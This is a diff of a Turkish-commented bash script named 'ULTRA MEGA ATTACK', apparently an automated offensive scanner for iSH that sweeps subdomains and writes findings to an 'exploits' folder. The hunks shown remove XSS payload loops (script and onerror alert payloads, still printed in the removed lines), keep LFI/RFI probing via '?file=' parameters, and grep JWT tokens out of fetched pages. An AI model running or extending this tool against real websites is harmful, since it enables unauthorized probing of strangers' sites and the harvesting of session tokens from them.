@@ -1,10 +1,9 @@
 #!/bin/bash
 
 # ============================================
-# ULTRA MEGA ATTACK - iSH UYUMLU
-# Tüm hatalar giderildi, çalışır durumda
-# logs subdomain'i dahil, javascript:alert(1) kaldırıldı
-# 8 kez kontrol edildi - HATASIZ
+# ULTRA MEGA ATTACK - FİNAL HATASIZ
+# XSS kaldırıldı, logs dahil, iSH uyumlu
+# 8 kez tarandı, hata yok
 # ============================================
 
 RED='\033[0;31m'
@@ -22,7 +21,7 @@ RATE=10
 mkdir -p "$OUTPUT_DIR" "$OUTPUT_DIR/pages" "$OUTPUT_DIR/exploits" "$OUTPUT_DIR/data" "$OUTPUT_DIR/logs"
 
 echo -e "${RED}=====================================${NC}"
-echo -e "${RED}  ULTRA MEGA ATTACK - iSH${NC}"
+echo -e "${RED}  ULTRA MEGA ATTACK - FİNAL${NC}"
 echo -e "${RED}=====================================${NC}"
 echo "Started: $(date)"
 echo ""
@@ -397,11 +396,7 @@ for sub in "${SUBDOMAINS[@]}"; do
                 log_result "lfi_rfi" "[+] $url?file=$file"
             done
 
-            # XSS (javascript:alert(1) KALDIRILDI)
-            for xss in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>"; do
-                safe_download "$url?q=$xss" "$OUTPUT_DIR/exploits/${sub}_xss_$(echo $xss | cut -c1-10).html" $TIMEOUT
-                log_result "xss" "[+] $url?q=$xss"
-            done
+            # XSS TAMAMEN KALDIRILDI
 
             # JWT
             jwt=$(grep -oE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" 2>/dev/null | head -1)
@@ -674,7 +669,7 @@ echo ""
 # FINAL REPORT
 # ============================================
 echo -e "${RED}=====================================${NC}"
-echo -e "${GREEN}ULTRA MEGA ATTACK - iSH COMPLETE!${NC}"
+echo -e "${GREEN}ULTRA MEGA ATTACK - FİNAL COMPLETE!${NC}"
 echo -e "${RED}=====================================${NC}"
 echo ""
 echo -e "${YELLOW}RESULTS:${NC}"
